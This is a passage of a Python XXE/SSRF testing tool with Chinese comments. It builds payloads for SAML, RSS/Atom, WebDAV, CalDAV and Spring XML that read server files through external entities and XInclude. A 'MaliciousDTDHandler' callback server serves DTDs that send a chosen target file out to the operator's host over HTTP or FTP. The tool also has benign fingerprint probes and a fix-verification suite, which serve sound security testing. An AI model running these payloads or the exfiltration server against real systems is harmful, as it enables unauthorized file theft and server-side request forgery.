            "expected_when_vulnerable": "收到请求 / 输出含文件内容",
            "requirements": ["服务端会执行上传的 XSLT"],
        })

        return results

    def generate_saml_payloads(self) -> List[Dict]:
        results = []

        raw = (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            "<!DOCTYPE Response [\n"
            f"  <!ENTITY xxe SYSTEM "
            f"{xml_attr(self._read_uri('saml', 'saml_response_xxe'))}>\n"
            "]>\n"
            '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" '
            'ID="probe" Version="2.0">\n'
            '  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" '
            'ID="a1" Version="2.0">\n'
            '    <saml:Subject>\n'
            '      <saml:NameID>&xxe;</saml:NameID>\n'
            "    </saml:Subject>\n"
            "  </saml:Assertion>\n"
            "</samlp:Response>"
        )
        b64 = base64.b64encode(raw.encode("utf-8")).decode("ascii")

        results.append({
            "name": "saml_response_xxe",
            "technique": "SAML Response XXE（Raw）",
            "description": "直接 POST XML 形式的 SAMLResponse",
            "payload": raw,
            "file_ext": ".xml",
            "content_type": "application/xml",
            "method": "POST",
            "injection_point": "SAMLResponse（非编码）",
            "target_component": ["OneLogin", "pysaml2", "Spring Security SAML",
                                 "Shibboleth", "OpenSAML"],
            "benign": self.benign,
            "interpretation": {"NameID 含文件内容": "存在 XXE"},
            "expected_when_fixed": "不解析实体",
            "expected_when_vulnerable": "文件内容进入 NameID",
            "requirements": ["IdP/SP 接受未编码的 XML 断言"],
        })

        results.append({
            "name": "saml_response_xxe_base64",
            "technique": "SAML Response XXE（Base64）",
            "description": "标准表单提交形式：Base64 编码后 POST",
            "payload": raw,
            "base64_saml": b64,
            "file_ext": ".xml",
            "content_type": "application/x-www-form-urlencoded",
            "method": "POST",
            "injection_point": "SAMLResponse（表单字段，Base64）",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "target_component": ["同上"],
            "benign": self.benign,
            "interpretation": {"NameID 含文件内容": "存在 XXE"},
            "expected_when_fixed": "不解析实体",
            "expected_when_vulnerable": "文件内容进入 NameID",
            "requirements": [],
        })

        results.append({
            "name": "saml_schema_ssrf",
            "technique": "SAML Schema SSRF",
            "description": "在 SAML 断言上加 schemaLocation 触发外部 XSD 请求",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" '
                'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
                'ID="probe" Version="2.0" '
                f'xsi:schemaLocation='
                f'{xml_attr("urn:oasis:names:tc:SAML:2.0:protocol " + self._ssrf_uri("saml", "saml_schema_ssrf"))}>\n'
                '  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" '
                'ID="a1" Version="2.0"/>\n'
                "</samlp:Response>"
            ),
            "file_ext": ".xml",
            "content_type": "application/xml",
            "method": "POST",
            "injection_point": "SAMLResponse",
            "target_component": ["启用 Schema 校验的 SAML 实现"],
            "benign": self.benign,
            "interpretation": {"收到 XSD 请求": "SSRF 成立"},
            "expected_when_fixed": "零回连",
            "expected_when_vulnerable": "收到请求",
            "requirements": ["启用 Schema 校验"],
        })

        return results

    def generate_rss_atom_payloads(self) -> List[Dict]:

        rss = {
            "name": "rss_feed_xxe",
            "technique": "RSS Feed XXE",
            "description": "RSS 订阅源解析是最经典的 XXE 入口之一",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                "<!DOCTYPE rss [\n"
                f"  <!ENTITY xxe SYSTEM "
                f"{xml_attr(self._read_uri('rss', 'rss_feed_xxe'))}>\n"
                "]>\n"
                '<rss version="2.0">\n'
                "  <channel>\n"
                "    <title>&xxe;</title>\n"
                "    <link>http://example.com</link>\n"
                "    <description>probe</description>\n"
                "  </channel>\n"
                "</rss>"
            ),
            "file_ext": ".xml",
            "content_type": "application/rss+xml",
            "injection_point": "RSS 订阅地址 / 上传",
            "target_component": ["RSS 阅读器", "内容聚合", "Feed 抓取服务"],
            "benign": self.benign,
            "interpretation": {"频道标题含文件内容": "存在 XXE"},
            "expected_when_fixed": "不解析实体",
            "expected_when_vulnerable": "文件内容进入标题",
            "requirements": [],
        }

        atom = {
            "name": "atom_feed_xxe",
            "technique": "Atom Feed XXE",
            "description": "Atom 1.0 格式变体",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                "<!DOCTYPE feed [\n"
                f"  <!ENTITY xxe SYSTEM "
                f"{xml_attr(self._read_uri('rss', 'atom_feed_xxe'))}>\n"
                "]>\n"
                '<feed xmlns="http://www.w3.org/2005/Atom">\n'
                "  <title>&xxe;</title>\n"
                "  <updated>2024-01-01T00:00:00Z</updated>\n"
                "</feed>"
            ),
            "file_ext": ".xml",
            "content_type": "application/atom+xml",
            "injection_point": "Atom 订阅地址 / 上传",
            "target_component": ["同上"],
            "benign": self.benign,
            "interpretation": {"标题含文件内容": "存在 XXE"},
            "expected_when_fixed": "不解析实体",
            "expected_when_vulnerable": "文件内容进入标题",
            "requirements": [],
        }

        blind = {
            "name": "rss_blind_ssrf",
            "technique": "RSS Blind SSRF",
            "description": "Feed 场景的出网探测",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                "<!DOCTYPE rss [\n"
                f"  <!ENTITY % ext SYSTEM "
                f"{xml_attr(self._ssrf_uri('rss', 'rss_blind_ssrf'))}>\n"
                "%ext;\n"
                "]>\n"
                '<rss version="2.0"><channel><title>probe</title></channel></rss>'
            ),
            "file_ext": ".xml",
            "content_type": "application/rss+xml",
            "injection_point": "RSS 订阅地址",
            "target_component": ["同上"],
            "benign": self.benign,
            "interpretation": {"收到请求": "SSRF 成立"},
            "expected_when_fixed": "零回连",
            "expected_when_vulnerable": "收到请求",
            "requirements": [],
        }
        return [rss, atom, blind]

    def generate_webdav_payloads(self) -> List[Dict]:
        XI_NS = "http://www.w3.org/2001/XInclude"

        propfind = {
            "name": "webdav_propfind_xxe",
            "technique": "WebDAV PROPFIND XXE",
            "description": "WebDAV 请求体是 XML，很多实现未做实体过滤",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                "<!DOCTYPE propfind [\n"
                f"  <!ENTITY xxe SYSTEM "
                f"{xml_attr(self._read_uri('webdav', 'webdav_propfind_xxe'))}>\n"
                "]>\n"
                '<d:propfind xmlns:d="DAV:">\n'
                "  <d:prop>\n"
                "    <d:displayname>&xxe;</d:displayname>\n"
                "  </d:prop>\n"
                "</d:propfind>"
            ),
            "file_ext": ".xml",
            "content_type": "application/xml",
            "method": "PROPFIND",
            "injection_point": "PROPFIND 请求体",
            "headers": {"Depth": "1", "Content-Type": "application/xml"},
            "target_component": ["Apache mod_dav", "Nginx dav 模块", "ownCloud",
                                 "Nextcloud", "Exchange WebDAV"],
            "benign": self.benign,
            "interpretation": {"displayname 含文件内容": "存在 XXE"},
            "expected_when_fixed": "不解析实体",
            "expected_when_vulnerable": "文件内容进入 displayname",
            "requirements": ["WebDAV 端点处理 XML 请求体"],
        }

        caldav = {
            "name": "caldav_report_xxe",
            "technique": "CalDAV REPORT XXE",
            "description": "CalDAV REPORT 方法同样接受 XML 请求体",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                "<!DOCTYPE calendar-query [\n"
                f"  <!ENTITY xxe SYSTEM "
                f"{xml_attr(self._read_uri('webdav', 'caldav_report_xxe'))}>\n"
                "]>\n"
                '<c:calendar-query xmlns:c="urn:ietf:params:xml:ns:caldav" '
                'xmlns:d="DAV:">\n'
                "  <d:prop>\n"
                "    <d:displayname>&xxe;</d:displayname>\n"
                "  </d:prop>\n"
                "</c:calendar-query>"
            ),
            "file_ext": ".xml",
            "content_type": "application/xml",
            "method": "REPORT",
            "injection_point": "REPORT 请求体",
            "headers": {"Depth": "1", "Content-Type": "application/xml"},
            "target_component": ["CalDAV 服务器", "日历同步服务"],
            "benign": self.benign,
            "interpretation": {"displayname 含文件内容": "存在 XXE"},
            "expected_when_fixed": "不解析实体",
            "expected_when_vulnerable": "文件内容进入 displayname",
            "requirements": [],
        }

        blind = {
            "name": "webdav_blind_ssrf",
            "technique": "WebDAV Blind SSRF",
            "description": "WebDAV 场景的出网探测",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                "<!DOCTYPE propfind [\n"
                f"  <!ENTITY % ext SYSTEM "
                f"{xml_attr(self._ssrf_uri('webdav', 'webdav_blind_ssrf'))}>\n"
                "%ext;\n"
                "]>\n"
                '<d:propfind xmlns:d="DAV:"><d:prop><d:displayname/></d:prop></d:propfind>'
            ),
            "file_ext": ".xml",
            "content_type": "application/xml",
            "method": "PROPFIND",
            "injection_point": "PROPFIND 请求体",
            "headers": {"Depth": "1"},
            "target_component": ["同上"],
            "benign": self.benign,
            "interpretation": {"收到请求": "SSRF 成立"},
            "expected_when_fixed": "零回连",
            "expected_when_vulnerable": "收到请求",
            "requirements": [],
        }

        xinclude = {
            "name": "webdav_xinclude_xxe",
            "technique": "WebDAV XInclude XXE",
            "description": "WebDAV 场景下绕过 DOCTYPE 禁用的变体",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<d:propfind xmlns:d="DAV:" xmlns:xi="{XI_NS}">\n'
                "  <d:prop>\n"
                "    <d:displayname>"
                f'<xi:include parse="text" '
                f'href={xml_attr(self._read_uri("webdav", "webdav_xinclude_xxe"))}/>'
                "</d:displayname>\n"
                "  </d:prop>\n"
                "</d:propfind>"
            ),
            "file_ext": ".xml",
            "content_type": "application/xml",
            "method": "PROPFIND",
            "injection_point": "PROPFIND 请求体",
            "headers": {"Depth": "1"},
            "target_component": ["禁用 DOCTYPE 但启用 XInclude 的 WebDAV 实现"],
            "benign": self.benign,
            "interpretation": {"displayname 含文件内容": "存在 XXE"},
            "expected_when_fixed": "不解析实体",
            "expected_when_vulnerable": "文件内容进入 displayname",
            "requirements": ["启用 XInclude"],
        }
        return [propfind, caldav, blind, xinclude]

    def generate_spring_xml_payloads(self) -> List[Dict]:
        XI_NS = "http://www.w3.org/2001/XInclude"

        beans = {
            "name": "spring_beans_xxe_file_read",
            "technique": "Spring XML Bean XXE",
            "description": "动态加载 XML Bean 配置的老系统",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                "<!DOCTYPE beans [\n"
                f"  <!ENTITY xxe SYSTEM "
                f"{xml_attr(self._read_uri('spring', 'spring_beans_xxe_file_read'))}>\n"
                "]>\n"
                '<beans xmlns="http://www.springframework.org/schema/beans" '
                'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">\n'
                '  <bean id="xxeProbe" class="java.lang.String">\n'
                '    <constructor-arg><value>&xxe;</value></constructor-arg>\n'
                "  </bean>\n"
                "</beans>"
            ),
            "file_ext": ".xml",
            "content_type": "application/xml",
            "injection_point": "XML 配置文件上传 / 动态加载",
            "target_component": ["老版 Spring", "插件化平台", "规则引擎配置"],
            "benign": self.benign,
            "interpretation": {"Bean 值含文件内容": "存在 XXE"},
            "expected_when_fixed": "不解析实体",
            "expected_when_vulnerable": "文件内容进入 Bean 值",
            "requirements": ["允许动态加载 XML 配置"],
        }

        ssrf = {
            "name": "spring_beans_ssrf",
            "technique": "Spring XML Bean SSRF",
            "description": "通过 schemaLocation 触发外部 XSD 请求",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<beans xmlns="http://www.springframework.org/schema/beans" '
                'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
                f'xsi:schemaLocation='
                f'{xml_attr("http://www.springframework.org/schema/beans " + self._ssrf_uri("spring", "spring_beans_ssrf"))}>\n'
                '  <bean id="probe" class="java.lang.String">\n'
                '    <constructor-arg><value>probe</value></constructor-arg>\n'
                "  </bean>\n"
                "</beans>"
            ),
            "file_ext": ".xml",
            "content_type": "application/xml",
            "injection_point": "XML 配置文件上传",
            "target_component": ["同上"],
            "benign": self.benign,
            "interpretation": {"收到 XSD 请求": "SSRF 成立"},
            "expected_when_fixed": "零回连",
            "expected_when_vulnerable": "收到请求",
            "requirements": ["启用 Schema 校验"],
        }

        xinclude = {
            "name": "spring_beans_xinclude_file_read",
            "technique": "Spring XML XInclude",
            "description": "绕过 DOCTYPE 禁用的变体",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<beans xmlns="http://www.springframework.org/schema/beans" '
                f'xmlns:xi="{XI_NS}">\n'
                '  <bean id="xincludeTest" class="java.lang.String">\n'
                "    <constructor-arg>\n"
                f'      <value><xi:include parse="text" '
                f'href={xml_attr(self._read_uri("spring", "spring_beans_xinclude_file_read"))}/></value>\n'
                "    </constructor-arg>\n"
                "  </bean>\n"
                "</beans>"
            ),
            "file_ext": ".xml",
            "content_type": "application/xml",
            "injection_point": "XML 配置文件上传",
            "target_component": ["启用 XInclude 的 Spring 环境"],
            "benign": self.benign,
            "interpretation": {"Bean 值含文件内容": "存在 XXE"},
            "expected_when_fixed": "不解析实体",
            "expected_when_vulnerable": "文件内容进入 Bean 值",
            "requirements": ["底层解析器启用 XInclude"],
        }
        return [beans, ssrf, xinclude]

    # ---------------- 防御视角 ----------------

    def generate_fingerprint_payloads(self) -> List[Dict]:
        """全部为无害探针，不读取任何文件、不请求任何外部资源（除 canary 自身）。"""
        canary = self._canary("fp", "fp_xsd_probe", "probe")
        results = []

        results.append({
            "name": "fp_doctype_probe",
            "technique": "DOCTYPE 处理探测",
            "description": "探测解析器是否处理 DOCTYPE 内部子集",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE root [ <!ENTITY probe "DOCTYPE_OK"> ]>\n'
                "<root>&probe;</root>"
            ),
            "file_ext": ".xml",
            "content_type": "application/xml",
            "target_component": ["通用"],
            "benign": True,
            "interpretation": {
                "响应含 DOCTYPE_OK": "DOCTYPE 内部子集被处理",
                "报错或不含": "DOCTYPE 被禁用（disallow-doctype-decl=true）",
            },
            "expected_when_fixed": "DOCTYPE_OK 不出现或被报错",
            "expected_when_vulnerable": "DOCTYPE_OK 出现在响应中",
            "requirements": [],
        })

        results.append({
            "name": "fp_internal_entity",
            "technique": "内部实体探测",
            "description": "探测内部通用实体是否被展开",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE root [ <!ENTITY a "INTERNAL"> <!ENTITY b "&a;_OK"> ]>\n'
                "<root>&b;</root>"
            ),
            "file_ext": ".xml",
            "content_type": "application/xml",
            "target_component": ["通用"],
            "benign": True,
            "interpretation": {
                "响应含 INTERNAL_OK": "内部实体与嵌套引用均被展开",
                "不含": "实体处理被禁用",
            },
            "expected_when_fixed": "不展开",
            "expected_when_vulnerable": "INTERNAL_OK 出现",
            "requirements": [],
        })

        results.append({
            "name": "fp_external_entity_local",
            "technique": "外部实体可用性探测（本地无害 URI）",
            "description": "用一个几乎一定存在且无害的本地文件判断外部实体是否被解析",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                "<!DOCTYPE root [\n"
                f'  <!ENTITY ext SYSTEM "{self._probe_local_file()}">\n'
                "]>\n"
                "<root>&ext;</root>"
            ),
            "file_ext": ".xml",
            "content_type": "application/xml",
            "target_component": ["通用"],
            "benign": True,
            "interpretation": {
                "返回空且无报错": "外部实体可用（Linux 读取 /dev/null 成功）",
                "返回 hosts 内容": "外部实体可用（Windows 探测文件路径）",
                "报错外部实体被禁止": "已加固",
                "报错文件不存在": "外部实体可用但路径不存在（Windows 上正常）",
            },
            "expected_when_fixed": "报错外部实体被禁用",
            "expected_when_vulnerable": "无报错且返回空内容",
            "requirements": [],
        })

        results.append({
            "name": "fp_param_entity",
            "technique": "参数实体探测",
            "description": "探测参数实体是否被处理（Blind XXE 的前置条件）",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE root [ <!ENTITY % p "<!ENTITY nested \'PARAM_OK\'>"> %p; ]>\n'
                "<root>&nested;</root>"
            ),
            "file_ext": ".xml",
            "content_type": "application/xml",
            "target_component": ["通用"],
            "benign": True,
            "interpretation": {
                "响应含 PARAM_OK": "参数实体 + 嵌套定义均可用，Local DTD Reuse 可行",
                "不含": "参数实体被禁用",
            },
            "expected_when_fixed": "不出现",
            "expected_when_vulnerable": "PARAM_OK 出现",
            "requirements": [],
        })

        results.append({
            "name": "fp_xinclude_probe",
            "technique": "XInclude 探测",
            "description": "探测 XInclude 是否启用（不读取任何真实文件）",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<root xmlns:xi="http://www.w3.org/2001/XInclude">\n'
                f'  <xi:include parse="text" href="{self._probe_local_file()}"/>\n'
                "</root>"
            ),
            "file_ext": ".xml",
            "content_type": "application/xml",
            "target_component": ["通用"],
            "benign": True,
            "interpretation": {
                "无报错且内容为空": "XInclude 被处理，存在 XInclude XXE 风险",
                "报错 'XInclude is not supported'": "已加固",
            },
            "expected_when_fixed": "报错或不处理",
            "expected_when_vulnerable": "XInclude 被静默处理",
            "requirements": [],
        })

        results.append({
            "name": "fp_xsd_probe",
            "technique": "Schema 校验探测",
            "description": "探测是否启用 Schema 校验与外部 XSD 加载",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
                f'xsi:noNamespaceSchemaLocation={xml_attr(canary)}>\n'
                "  <data>probe</data>\n"
                "</root>"
            ),
            "file_ext": ".xml",
            "content_type": "application/xml",
            "target_component": ["通用"],
            "benign": True,
            "interpretation": {
                "canary 服务器收到请求": "外部 XSD 加载启用，存在 Schema SSRF",
                "无请求": "Schema 校验或外部 XSD 被禁用",
            },
            "expected_when_fixed": "零回连",
            "expected_when_vulnerable": "收到 canary 请求",
            "requirements": [],
        })

        results.append({
            "name": "fp_entity_expansion_tiny",
            "technique": "实体扩展限制探测（极轻量）",
            "description": "用 1000 字符的展开量探测实体扩展上限，不会造成实际压力",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                "<!DOCTYPE root [\n"
                '  <!ENTITY a "AAAAAAAAAA">\n'
                '  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">\n'
                '  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">\n'
                "]>\n"
                "<root>&c;</root>"
            ),
            "file_ext": ".xml",
            "content_type": "application/xml",
            "target_component": ["通用"],
            "benign": True,
            "interpretation": {
                "返回 1000 个 A": "无实体扩展限制，DoS 面存在",
                "报错 'entity expansion limit'": "已配置上限",
            },
            "expected_when_fixed": "触达上限后报错",
            "expected_when_vulnerable": "返回 1000 个 A",
            "requirements": [],
        })

        return results

    def generate_verify_fix_suite(self) -> Dict[str, List[Dict]]:
        """
        [A5] v2.1 对每一类只取 [:1]，17/85 = 20% 覆盖率，
        却照样输出"已覆盖 17/17" —— 它自己声称要修的 [P2-1] 虚假覆盖
        并没有真正修掉。v2.2 改为每类取全部探针，并把 fingerprint
        （7 个解析器配置探针，信息量最大的一类）也纳入覆盖矩阵。
        """
        saved = self.benign
        self.benign = True
        try:
            providers = {
                "basic": lambda: [self.generate_basic_file_entity_payload()],
                "local_dtd": self.generate_local_dtd_payload,
                "error_based": lambda: [self.generate_error_based_payload()],
                "blind_ssrf": self.generate_blind_ssrf_payload,
                "xinclude": self.generate_xinclude_payload,
                "schema_ssrf": self.generate_schema_ssrf_payload,
                "fingerprint": self.generate_fingerprint_payloads,
                "soap": self.generate_soap_payloads,
                "svg": self.generate_svg_payloads,
                "office_ooxml": self.generate_office_payloads,
                "office_odf": self.generate_odf_payloads,
                "epub": self.generate_epub_payloads,
                "xmp_image": self.generate_xmp_image_payloads,
                "misc_xml": self.generate_misc_xml_payloads,
                "saml": self.generate_saml_payloads,
                "rss_atom": self.generate_rss_atom_payloads,
                "webdav": self.generate_webdav_payloads,
                "spring_xml": self.generate_spring_xml_payloads,
            }
            results: Dict[str, List[Dict]] = {}
            for cat, fn in providers.items():
                items = []
                for p in fn():
                    p = dict(p)
                    p["benign"] = True
                    p["expected_when_fixed"] = "零回连、零文件内容泄露"
                    p["expected_when_vulnerable"] = "收到 canary 请求或泄露文件内容"
                    if cat == "local_dtd":
                        p["note"] = (
                            "半无害探针：仍需目标主机真实存在该本地 DTD，"
                            "但不读取 --target-file")
                    items.append(p)
                if items:
                    results[cat] = items
        finally:
            self.benign = saved
        return results

    # ---------------- 汇总 ----------------

    def generate_scenario_payloads(self) -> Dict[str, List[Dict]]:
        return {
            "soap": self.generate_soap_payloads(),
            "svg": self.generate_svg_payloads(),
            "office_ooxml": self.generate_office_payloads(),
            "office_odf": self.generate_odf_payloads(),
            "epub": self.generate_epub_payloads(),
            "xmp_image": self.generate_xmp_image_payloads(),
            "misc_xml": self.generate_misc_xml_payloads(),
            "saml": self.generate_saml_payloads(),
            "rss_atom": self.generate_rss_atom_payloads(),
            "webdav": self.generate_webdav_payloads(),
            "spring_xml": self.generate_spring_xml_payloads(),
        }

    def generate_all_payloads(self) -> Dict[str, List[Dict]]:
        results: Dict[str, List[Dict]] = {
            "basic": [self.generate_basic_file_entity_payload()],
            "local_dtd": self.generate_local_dtd_payload(),
            "error_based": [self.generate_error_based_payload()],
            "blind_ssrf": self.generate_blind_ssrf_payload(),
            "xinclude": self.generate_xinclude_payload(),
            "schema_ssrf": self.generate_schema_ssrf_payload(),
            "fingerprint": self.generate_fingerprint_payloads(),
        }
        results.update(self.generate_scenario_payloads())
        return results


# ============================================================================
# 第六部分：传输层封装（[P1-11] 修复返回类型标注）
# ============================================================================

class TransportWrapper:
    @staticmethod
    def multipart_upload(url: str, field_name: str, filename: str,
                         file_content: bytes,
                         content_type: str = "application/octet-stream"
                         ) -> Tuple[bytes, str]:
        """生成 multipart/form-data 请求体。返回 (body, content_type)。"""
        boundary = f"----WebKitFormBoundary{uuid.uuid4().hex}"
        safe_name = filename.replace('"', "").replace("\r", "").replace("\n", "")
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{field_name}"; filename="{safe_name}"\r\n'
            f"Content-Type: {content_type}\r\n"
            f"\r\n"
        ).encode("utf-8") + file_content + f"\r\n--{boundary}--\r\n".encode("utf-8")
        return body, f"multipart/form-data; boundary={boundary}"

    @staticmethod
    def soap_with_attachment(xml_content: bytes, host: str, path: str,
                             soap_action: str = "urn:probe",
                             attachment: Optional[bytes] = None,
                             attachment_name: str = "payload.xml"
                             ) -> Tuple[bytes, str]:
        """[P2-2] 生成 SOAP MTOM / SwA 风格请求。返回 (body, content_type)。"""
        boundary = f"MIMEBoundary{uuid.uuid4().hex}"
        parts = [
            f"--{boundary}\r\n"
            'Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\n'
            "Content-Transfer-Encoding: binary\r\n"
            'Content-ID: <root.message@cxf.apache.org>\r\n'
            "\r\n"
        ]
        body = parts[0].encode("utf-8") + xml_content + b"\r\n"

        if attachment is not None:
            body += (
                f"--{boundary}\r\n"
                "Content-Type: application/octet-stream\r\n"
                "Content-Transfer-Encoding: binary\r\n"
                f'Content-ID: <{attachment_name}>\r\n'
                f'Content-Disposition: attachment; name="{attachment_name}"\r\n'
                "\r\n"
            ).encode("utf-8") + attachment + b"\r\n"

        body += f"--{boundary}--\r\n".encode("utf-8")
        ctype = f'multipart/related; type="application/xop+xml"; boundary={boundary}'
        return body, ctype

    @staticmethod
    def build_http_request(method: str, path: str, host: str,
                           content_type: str, body: bytes,
                           extra_headers: Optional[Dict[str, str]] = None) -> bytes:
        headers = [f"{method} {path} HTTP/1.1", f"Host: {host}"]
        if content_type:
            headers.append(f"Content-Type: {content_type}")
        headers.append(f"Content-Length: {len(body)}")
        if extra_headers:
            for k, v in extra_headers.items():
                headers.append(f"{k}: {v}")
        headers.append("Connection: close")
        return ("\r\n".join(headers) + "\r\n\r\n").encode("utf-8") + body


# ============================================================================
# 第七部分：DTD / Canary 回调服务器
#           （[P1-7] do_POST / do_HEAD，[P1-8] 日志加锁，[P1-9] OOB 编码，[P1-12] 正则分类）
# ============================================================================

class MaliciousDTDHandler(BaseHTTPRequestHandler):
    target_file = "/etc/hostname"
    target_os = "linux"
    target_platform = "java"
    log_file = "callbacks.jsonl"
    public_host: Optional[str] = None
    oob_mode = "plain"
    canary_map: Dict[str, Dict] = {}
    # [v2.3][P1] 无害模式：/evil.dtd 与 /oob.dtd 不再引导目标读取真实文件
    benign = False
    # [v2.3][P2] FTP 外带接收端（独立于 HTTP 端口）
    ftp_host: Optional[str] = None
    benign_run_id = uuid.uuid4().hex[:8]
    benign_slug = uuid.uuid4().hex[:6]
    _ftp_warned = False

    server_version = "XXE-Canary/2.3"
    protocol_version = "HTTP/1.1"

    # ---------- 工具 ----------

    def log_message(self, fmt: str, *args) -> None:
        """默认 log_message 会往 stderr 打访问日志，与我们的回调日志重复，静默它。"""
        return

    def _append_log(self, event: Dict) -> None:
        try:
            with _LOG_LOCK:
                with open(self.log_file, "a", encoding="utf-8") as f:
                    f.write(json.dumps(event, ensure_ascii=False) + "\n")
                    f.flush()
        except OSError as e:
            sys.stderr.write(f"[!] 写入回调日志失败: {e}\n")

    def _send(self, code: int, body: bytes,
              ctype: str = "text/plain; charset=utf-8") -> None:
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        if self.command != "HEAD":
            try:
                self.wfile.write(body)
            except (BrokenPipeError, ConnectionResetError):
                pass

    def _label(self) -> str:
        """
        [A3] 提取 canary 标签，支持两种投递形态。

        v2.1 只认 Host 子域名，attacker 是 IP 时整条 benign 链路失效。
            dns  : http://{label}.{attacker_host}
            path : http://{attacker_host}/c/{label}
        """
        p = urlparse(self.path).path
        if p.startswith("/c/"):
            return p[3:].split("/")[0].strip().lower()
        host = (self.headers.get("Host") or "").strip().lower()
        return host.split(":")[0].split(".")[0]

    def _classify(self, label: str) -> Tuple[str, str]:
        """[P1-12][A4] 用精确正则取代 v2.0 的宽松子串匹配。"""
        m = CANARY_LABEL_RE.match((label or "").lower())
        if m:
            return m.group("cat"), m.group("rid")
        return "uncategorized", ""

    def _peer_host(self) -> str:
        """外带地址：优先显式 --public-host，其次 Host 头。"""
        if self.public_host:
            return self.public_host
        return (self.headers.get("Host") or "127.0.0.1:8080").strip()

    def _error_prefix(self) -> str:
        if self.target_os == "windows":
            return "file:///C:/nonexistent_xxe_error/"
        return "file:///nonexistent_xxe_error/"

    def _benign_file_uri(self, cat: str) -> str:
        """
        [v2.3][P1] 无害模式下 DTD 里的 %file 改指 canary URL。

        v2.2 的 /evil.dtd、/oob.dtd 无条件用 --target-file 构造 DTD，
        服务器没有 benign 概念 —— 未授权用户跑 verify_fix + --serve 就能让
        未修复目标读出真实文件内容，授权闸门的豁免（BENIGN_MODES）形同虚设。
        """
        label = f"{cat}-file-{self.benign_slug}-{self.benign_run_id}"
        return f"http://{self._peer_host()}/c/{label}"

    def _ftp_exfil_host(self) -> str:
        """
        [v2.3][P2] FTP 外带地址独立于 HTTP 端口。

        v2.2 直接复用 _peer_host()（含 HTTP 端口），产出
        ftp://127.0.0.1:8080/%file; —— 拿 FTP 协议去连 HTTP 端口，外带必挂。
        优先 --ftp-host；未指定时剥离端口（FTP 默认 21）并告警。
        """
        if self.ftp_host:
            return self.ftp_host
        host = self._peer_host().rsplit(":", 1)[0]
        if not MaliciousDTDHandler._ftp_warned:
            MaliciousDTDHandler._ftp_warned = True
            print(f"[!] 未指定 --ftp-host，FTP 外带退化为 {host}:21。"
                  "本工具不提供 FTP 监听，需自备 FTP 接收端，"
                  "或用 --ftp-host host[:port] 指定")
        return host

    def _errdtd_body(self) -> str:
        file_uri = (self._benign_file_uri("evilprobe") if self.benign
                    else normalize_file_uri(self.target_file))
        return (
            f"<!ENTITY % file SYSTEM {xml_attr(file_uri)}>\n"
            "<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM "
            f"'{self._error_prefix()}%file;'>\">\n"
            "%eval;\n"
            "%error;\n"
        )

    def _oobdtd_body(self, enc: str) -> str:
        host = self._peer_host()

        if enc == "auto":
            # PHP 有 php://filter 可以先把内容 base64 化；
            # Java 没有等价物，多行外带只能靠 FTP。
            enc = "b64" if self.target_platform == "php" else "ftp"

        if self.benign:
            # [v2.3][P1] 无害模式：%file 指向 canary URL，不读真实文件；
            # php://filter 也不包了（包一个 http URL 没有意义）
            file_uri = self._benign_file_uri("oobprobe")
        elif enc == "b64":
            # PHP 目标：先 base64 编码再外带，规避换行与二进制字符
            file_uri = f"php://filter/convert.base64-encode/resource={self.target_file}"
        else:
            file_uri = normalize_file_uri(self.target_file)

        if enc == "ftp":
            # Java 目标：FTP 天然支持多行，需外部 FTP 接收端
            return (
                f"<!ENTITY % file SYSTEM {xml_attr(file_uri)}>\n"
                f"<!ENTITY % exfil SYSTEM 'ftp://{self._ftp_exfil_host()}/%file;'>\n"
                "%exfil;\n"
            )
        return (
            f"<!ENTITY % file SYSTEM {xml_attr(file_uri)}>\n"
            f"<!ENTITY % exfil SYSTEM 'http://{host}/?d=%file;'>\n"
            "%exfil;\n"
        )

    @staticmethod
    def _parse_body(body: bytes) -> Dict[str, str]:
        if not body:
            return {}
        try:
            parsed = parse_qs(body.decode("utf-8", "replace"))
            if parsed:
                return {k: v[0] for k, v in parsed.items()}
        except Exception:
            pass
        return {"raw_b64": base64.b64encode(body).decode("ascii")}

    # ---------- 路由 ----------

    def do_GET(self) -> None:
        self._dispatch(b"")

    def do_HEAD(self) -> None:
        self._dispatch(b"")

    def do_POST(self) -> None:
        length = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(length) if length > 0 else b""
        self._dispatch(body)

